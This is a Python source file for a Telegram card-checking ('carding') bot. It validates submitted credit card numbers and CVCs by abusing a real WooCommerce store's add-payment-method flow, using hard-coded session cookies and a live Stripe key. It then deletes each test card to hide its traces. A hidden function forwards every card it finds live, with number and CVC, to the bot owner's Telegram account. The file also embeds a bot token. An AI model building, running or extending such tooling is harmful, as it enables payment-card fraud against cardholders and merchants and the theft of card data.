import requests
import uuid
import time
import json
import re
import threading
import os
from typing import Optional, Dict, Any, List, Tuple
from flask import Flask
import telebot  # pip install pyTelegramBotAPI flask requests

# ------------------------------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------------------------------
BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
OWNER_ID = 8241973550  # Your Telegram User ID

# File to store allowed users
USERS_FILE = "allowed_users.txt"

# Target Site Config
SITE_URL = "https://infiniteautowerks.com"
PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=gtfr%7C1770178761%7C1Z4vr5jEPFY8BnVkhQUxKqJb9AHn8KtA1WAiYPOpgNk%7Cbab8b45235d97384da36d63a3d3156a322f8d00c5553908e4798e800bcf6baf3; checkout_continuity_service=18e8439a-8c0a-4282-baa5-c8730e006a98; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=6sMD0NBiyoixEIz1kD7cwKDv; __stripe_mid=a7dc99f3-7ed5-4c61-a39f-d169213f19fda0531d; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=gtfr%7C1770178761%7C1Z4vr5jEPFY8BnVkhQUxKqJb9AHn8KtA1WAiYPOpgNk%7Cd10c4724e23442755b948c7ceeb887a8fccbf1ed7fc48f4825357624211b1d71; __cf_bm=Y9a_kVSS_6rHH_WpFqvvL4gpvXqT0hxjL9nT4EP5wmA-1769142171-1.0.1.1-oukQTL.0IOntwz67yM69e2YmiFI14iCOYxnlhTquR_B2TPVQjYRXsQfL9vnJICcCf2TNl3bRgzV0PrnzI4sZnah.sPtijy6m8egKoB3dn4o; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-23%2003%3A52%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-23%2003%3A52%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; __stripe_sid=81772e11-a027-4b3a-8f62-dfd1da3c8b46d319a9"""

# Auto-delete cards after check (set to False to keep cards)
AUTO_DELETE_CARDS = True

# ------------------------------------------------------------------------------------------
# USER MANAGEMENT HELPERS
# ------------------------------------------------------------------------------------------
def load_allowed_users() -> List[int]:
    if not os.path.exists(USERS_FILE):
        return []
    try:
        with open(USERS_FILE, "r") as f:
            return [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        return []

def save_allowed_user(user_id: int):
    users = load_allowed_users()
    if user_id not in users:
        with open(USERS_FILE, "a") as f:
            f.write(f"{user_id}\n")

def remove_allowed_user(user_id: int):
    users = load_allowed_users()
    if user_id in users:
        users.remove(user_id)
        with open(USERS_FILE, "w") as f:
            for u in users:
                f.write(f"{u}\n")

# ------------------------------------------------------------------------------------------
# FLASK APP FOR HEALTH CHECKS
# ------------------------------------------------------------------------------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!", 200

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive_ping():
    while True:
        time.sleep(300)
        try:
            port = int(os.environ.get("PORT", 8080))
            requests.get(f"http://127.0.0.1:{port}")
            print("Ping sent to keep alive")
        except Exception as e:
            print(f"Ping failed: {e}")

# ------------------------------------------------------------------------------------------
# COUNTRY MAP
# ------------------------------------------------------------------------------------------
COUNTRY_MAP = {
    'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
    'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany',
    'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'MX': 'Mexico', 'JP': 'Japan',
    'CN': 'China', 'KR': 'South Korea', 'RU': 'Russia', 'NL': 'Netherlands',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
    'VN': 'Vietnam', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'NG': 'Nigeria',
    'ZA': 'South Africa', 'EG': 'Egypt', 'TR': 'Turkey', 'PL': 'Poland',
    'UA': 'Ukraine', 'AR': 'Argentina', 'CO': 'Colombia', 'CL': 'Chile',
    'PE': 'Peru', 'VE': 'Venezuela', 'SA': 'Saudi Arabia', 'AE': 'UAE',
    'IL': 'Israel', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark',
    'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria', 'CH': 'Switzerland',
    'PT': 'Portugal', 'GR': 'Greece', 'CZ': 'Czech Republic', 'RO': 'Romania',
    'HU': 'Hungary', 'IE': 'Ireland', 'NZ': 'New Zealand', 'HK': 'Hong Kong',
    'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
}

# ------------------------------------------------------------------------------------------
# STRIPE AUTOMATION WITH AUTO-DELETE
# ------------------------------------------------------------------------------------------
class StripeWooCommerceAutomation:
    def __init__(self, site_url: str, cookies: str = None, publishable_key: str = None):
        self.site_url = site_url.rstrip('/')
        self.cookies = cookies
        self.publishable_key = publishable_key
        self.session = requests.Session()
        if cookies:
            self._set_cookies(cookies)
    
    def _set_cookies(self, cookie_string: str):
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                self.session.cookies.set(key, value)
    
    def _generate_session_ids(self) -> Dict[str, str]:
        return {
            'guid': str(uuid.uuid4()).replace('-', '')[:32] + 'ca450',
            'muid': str(uuid.uuid4()).replace('-', '')[:32] + '531d',
            'sid': str(uuid.uuid4()).replace('-', '')[:32] + '05f1',
            'client_session_id': str(uuid.uuid4()),
            'elements_session_config_id': str(uuid.uuid4())
        }
    
    def _get_common_headers(self) -> Dict[str, str]:
        return {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
    
    def fetch_ajax_nonce(self) -> Optional[str]:
        url = f"{self.site_url}/my-account/add-payment-method/"
        try:
            response = self.session.get(url, headers=self._get_common_headers(), timeout=30)
            patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
                r'wc-stripe-[^"]*nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
                r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]+)["\']',
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
            if not self.publishable_key:
                pk_match = re.search(r'pk_(?:live|test)_[a-zA-Z0-9]+', response.text)
                if pk_match:
                    self.publishable_key = pk_match.group(0)
            return None
        except:
            return None
    
    def fetch_payment_methods(self) -> Tuple[List[Dict[str, Any]], Optional[str]]:
        """Fetch all payment methods from the account for deletion."""
        url = f"{self.site_url}/my-account/payment-methods/"
        
        try:
            response = self.session.get(url, headers=self._get_common_headers(), timeout=30)
            html = response.text
            
            payment_methods = []
            delete_nonce = None
            
            # Pattern: /my-account/delete-payment-method/123/?_wpnonce=abc123
            delete_pattern = r'href=["\']([^"\']*?/delete-payment-method/(\d+)/[^"\']*_wpnonce=([a-f0-9]+)[^"\']*)["\']'
            matches = re.findall(delete_pattern, html, re.IGNORECASE)
            
            for full_url, token_id, nonce in matches:
                delete_nonce = nonce
                clean_url = full_url.replace('&amp;', '&')
                if not clean_url.startswith('http'):
                    clean_url = f"{self.site_url}{clean_url}"
                
                payment_methods.append({
                    'token_id': token_id,
                    'delete_url': clean_url,
                    'nonce': nonce
                })
            
            # Try to find last4 for each payment method
            row_pattern = r'<tr[^>]*>(.*?)</tr>'
            rows = re.findall(row_pattern, html, re.IGNORECASE | re.DOTALL)
            
            for row in rows:
                delete_match = re.search(r'delete-payment-method/(\d+)/', row, re.IGNORECASE)
                if delete_match:
                    token_id = delete_match.group(1)
                    
                    # Find last4 in this row
                    last4_match = re.search(r'(\d{4})\s*(?:</|<span|$)', row)
                    if not last4_match:
                        last4_match = re.search(r'(?:ending\s+in|\.{4}|\*{4})\s*(\d{4})', row, re.IGNORECASE)
                    if not last4_match:
                        last4_match = re.search(r'>(\d{4})<', row)
                    
                    if last4_match:
                        last4 = last4_match.group(1)
                        for pm in payment_methods:
                            if pm['token_id'] == token_id:
                                pm['last4'] = last4
                                break
            
            # Fallback: match by position
            if payment_methods and not any(pm.get('last4') for pm in payment_methods):
                all_last4 = re.findall(r'(?:ending\s+in|\.{4}|\*{4}|>\s*)(\d{4})(?:\s*<|\s|$)', html, re.IGNORECASE)
                for i, pm in enumerate(payment_methods):
                    if i < len(all_last4):
                        pm['last4'] = all_last4[i]
            
            return payment_methods, delete_nonce
            
        except:
            return [], None
    
    def delete_payment_method(self, delete_url: str) -> Dict[str, Any]:
        """Delete a payment method using its delete URL."""
        headers = self._get_common_headers()
        headers['referer'] = f"{self.site_url}/my-account/payment-methods/"
        
        try:
            response = self.session.get(delete_url, headers=headers, timeout=30, allow_redirects=True)
            success = response.status_code == 200 and '/payment-methods/' in response.url
            
            if success or 'deleted' in response.text.lower():
                return {'success': True, 'message': 'Deleted'}
            
            return {'success': success, 'message': 'Delete completed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def delete_last_payment_method(self) -> Dict[str, Any]:
        """Delete the most recently added payment method."""
        payment_methods, _ = self.fetch_payment_methods()
        
        if not payment_methods:
            return {'success': False, 'error': 'No payment methods found'}
        
        last_pm = payment_methods[-1]
        return self.delete_payment_method(delete_url=last_pm['delete_url'])
    
    def delete_payment_method_by_last4(self, last4: str) -> Dict[str, Any]:
        """Delete a payment method by its last 4 digits."""
        payment_methods, _ = self.fetch_payment_methods()
        
        for pm in payment_methods:
            if pm.get('last4') == last4:
                return self.delete_payment_method(delete_url=pm['delete_url'])
        
        return {'success': False, 'error': f'No card ending in {last4}'}
    
    def create_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code, country="US"):
        url = "https://api.stripe.com/v1/payment_methods"
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
        }
        session_ids = self._generate_session_ids()
        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': cvc,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'billing_details[address][postal_code]': postal_code,
            'billing_details[address][country]': country,
            'key': self.publishable_key,
            'guid': session_ids['guid'],
            'muid': session_ids['muid'],
            'sid': session_ids['sid'],
            'payment_user_agent': 'stripe.js/43a1cb09b6; stripe-js-v3/43a1cb09b6; payment-element; deferred-intent'
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            return {
                'success': response.status_code == 200 and 'id' in result,
                'response': result,
                'payment_method_id': result.get('id'),
                'card_brand': result.get('card', {}).get('brand', '').upper(),
                'card_funding': result.get('card', {}).get('funding', '').upper(),
                'card_country': result.get('card', {}).get('country'),
                'last4': result.get('card', {}).get('last4')
            }
        except Exception as e:
            return {'success': False, 'error': str(e), 'response': None}

    def confirm_setup_intent(self, payment_method_id, ajax_nonce):
        url = f"{self.site_url}/wp-admin/admin-ajax.php"
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.site_url,
            'priority': 'u=1, i',
            'referer': f'{self.site_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            try:
                result = response.json()
            except:
                result = {'raw': response.text}
            
            success = False
            if response.status_code == 200:
                if isinstance(result, dict):
                    if isinstance(result.get('success'), bool):
                        success = result.get('success')
                    elif result.get('data', {}).get('status') == 'succeeded':
                        success = True
                else:
                    success = False
            
            error_msg = None
            if not success:
                if isinstance(result, dict):
                    data = result.get('data')
                    if isinstance(data, dict):
                        error_msg = data.get('error', {}).get('message')
                    else:
                        error_msg = f"Unknown error (data: {data})"
                else:
                    error_msg = f"Unexpected response format: {result}"
            
            return {'success': success, 'response': result, 'error_message': error_msg}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def add_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code="10001", country="US", auto_delete=True):
        """Complete flow: Create, Confirm, and optionally Delete payment method."""
        
        # Step 1: Create Payment Method with Stripe
        pm = self.create_payment_method(card_number, exp_month, exp_year, cvc, postal_code, country)
        if not pm['success']:
            err = pm.get('response', {}).get('error', {}).get('message', 'Unknown Stripe Error')
            return {'success': False, 'msg': f"Stripe Token Failed: {err}", 'data': pm, 'deleted': False}
        
        card_last4 = pm.get('last4')
        
        # Step 2: Fetch AJAX Nonce
        nonce = self.fetch_ajax_nonce()
        if not nonce:
            return {'success': False, 'msg': "Failed to get AJAX Nonce from site", 'data': pm, 'deleted': False}
        
        # Step 3: Confirm Setup Intent
        confirm = self.confirm_setup_intent(pm['payment_method_id'], nonce)
        
        result = {
            'success': confirm['success'],
            'msg': "Approved" if confirm['success'] else f"Declined: {confirm.get('error_message')}",
            'data': pm,
            'deleted': False
        }
        
        # Step 4: Auto-delete if successful and enabled
        if confirm['success'] and auto_delete:
            # Wait 2 seconds for card to appear in payment methods list
            time.sleep(2)
            
            # Try to delete by last4 first
            delete_result = None
            if card_last4:
                delete_result = self.delete_payment_method_by_last4(card_last4)
            
            # Fallback: delete last payment method
            if not delete_result or not delete_result.get('success'):
                delete_result = self.delete_last_payment_method()
            
            result['deleted'] = delete_result.get('success', False)
        
        return result

# ------------------------------------------------------------------------------------------
# TELEGRAM BOT HANDLERS
# ------------------------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_TOKEN)

def parse_card_pipe(text):
    text = text.strip()
    match = re.search(r'(\d{15,16})[|/:\s]+(\d{1,2})[|/:\s]+(\d{2,4})[|/:\s]+(\d{3,4})', text)
    if match:
        return {
            'number': match.group(1),
            'month': match.group(2).zfill(2),
            'year': match.group(3)[-2:] if len(match.group(3)) == 4 else match.group(3),
            'cvc': match.group(4)
        }
    return None

def notify_owner_live_card(user, card, card_info, country_info):
    """Send notification to owner when a live card is found."""
    try:
        user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
        notification = (
            "🚨 *LIVE CARD FOUND* 🚨\n\n"
            f"👤 𝐔𝐬𝐞𝐫: {user_info}\n"
            f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: `{user.id}`\n\n"
            f"💳 𝐂𝐚𝐫𝐝: `{card['number']}|{card['month']}|{card['year']}|{card['cvc']}`\n"
            f"ℹ️ 𝐈𝐧𝐟𝐨: {card_info}\n"
            f"🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_info}\n\n"
            f"⏰ 𝐓𝐢𝐦𝐞: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        bot.send_message(OWNER_ID, notification, parse_mode='Markdown')
    except Exception as e:
        print(f"Failed to notify owner: {e}")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "🔥 *Stripe Auth Checker Bot* 🔥\n\n"
        "Welcome! This high-speed bot checks cards using Stripe Auth & WooCommerce Setup Intents.\n\n"
        "✅ *FREE ACCESS* - Open for all users!\n\n"
        "💎 *Want Your Own Bot?*\n"
        "• *Personal Bot*: Pay *$5* to the owner and get a custom setup!\n\n"
        "👤 *Contact Owner*: @llegaccy\n\n"
        "👇 *How to Use*:\n"
        "`/chk cc|mm|yy|cvc`\n"
        f"🆔 Your ID: `{message.from_user.id}`"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

# ------------------------------------------------------------------------------------------
# ADMIN COMMANDS
# ------------------------------------------------------------------------------------------
@bot.message_handler(commands=['add'])
def add_user_command(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_to_add = int(message.text.split()[1])
        save_allowed_user(user_to_add)
        bot.reply_to(message, f"✅ User {user_to_add} added to access list.")
    except:
        bot.reply_to(message, "⚠️ Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_to_remove = int(message.text.split()[1])
        remove_allowed_user(user_to_remove)
        bot.reply_to(message, f"❌ User {user_to_remove} removed from access list.")
    except:
        bot.reply_to(message, "⚠️ Usage: /remove <user_id>")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != OWNER_ID:
        return
    users = load_allowed_users()
    if not users:
        bot.reply_to(message, "No users in allowed list.")
    else:
        bot.reply_to(message, f"👥 Authorized Users:\n" + "\n".join(str(u) for u in users))

# ------------------------------------------------------------------------------------------
# MAIN CHECKER COMMAND
# ------------------------------------------------------------------------------------------
@bot.message_handler(commands=['chk'])
def check_card_command(message):
    # PUBLIC ACCESS - No auth check needed
    user = message.from_user

    msg_args = message.text.split(" ", 1)
    if len(msg_args) < 2:
        bot.reply_to(message, "⚠️ Usage: /chk cc|mm|yy|cvc")
        return
    
    card_raw = msg_args[1]
    card = parse_card_pipe(card_raw)
    
    if not card:
        bot.reply_to(message, "❌ Invalid card format. Use: cc|mm|yy|cvc")
        return

    status_msg = bot.reply_to(message, "⌛ Checking...")

    try:
        automation = StripeWooCommerceAutomation(
            site_url=SITE_URL,
            cookies=COOKIES,
            publishable_key=PUBLISHABLE_KEY
        )
        
        result = automation.add_payment_method(
            card_number=card['number'],
            exp_month=card['month'],
            exp_year=card['year'],
            cvc=card['cvc'],
            auto_delete=AUTO_DELETE_CARDS  # Auto-delete enabled
        )
        
        # Formatting response
        pm_data = result.get('data', {})
        card_brand = pm_data.get('card_brand', 'UNKNOWN')
        card_funding = pm_data.get('card_funding', 'UNKNOWN')
        country_code = pm_data.get('card_country', 'US')
        country_name = COUNTRY_MAP.get(country_code, country_code)
        
        status_emoji = "✅" if result['success'] else "❌"
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if result['success'] else "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        
        # Add delete status to message
        delete_status = ""
        if result['success'] and AUTO_DELETE_CARDS:
            delete_status = " 🗑️" if result.get('deleted') else " ⚠️(not deleted)"
        
        response_text = (
            f"{status_emoji} {status_text}{delete_status}\n\n"
            f"💳 𝐂𝐚𝐫𝐝: `{card['number']}|{card['month']}|{card['year']}|{card['cvc']}`\n"
            f"⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth\n"
            f"ℹ️ 𝐈𝐧𝐟𝐨: {card_brand} - {card_funding}\n"
            f"🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} ({country_code})\n"
            f"📝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {result['msg']}\n\n"
            f"👤 𝐎𝐰𝐧𝐞𝐫: @llegaccy"
        )
        
        bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')
        
        # Notify owner if card is LIVE
        if result['success'] and user.id != OWNER_ID:
            notify_owner_live_card(
                user=user,
                card=card,
                card_info=f"{card_brand} - {card_funding}",
                country_info=f"{country_name} ({country_code})"
            )

    except Exception as e:
        bot.edit_message_text(f"⚠️ Error: {str(e)}", chat_id=message.chat.id, message_id=status_msg.message_id)

# ------------------------------------------------------------------------------------------
# EXECUTION
# ------------------------------------------------------------------------------------------
if __name__ == "__main__":
    # Start Keep-Alive Pinger in background
    pinger_thread = threading.Thread(target=keep_alive_ping)
    pinger_thread.daemon = True
    pinger_thread.start()

    # Start Flask Server in background
    server_thread = threading.Thread(target=run_web_server)
    server_thread.daemon = True
    server_thread.start()

    print("🤖 Bot Started...")
    print(f"🗑️ Auto-delete cards: {'ON' if AUTO_DELETE_CARDS else 'OFF'}")
    bot.infinity_polling()
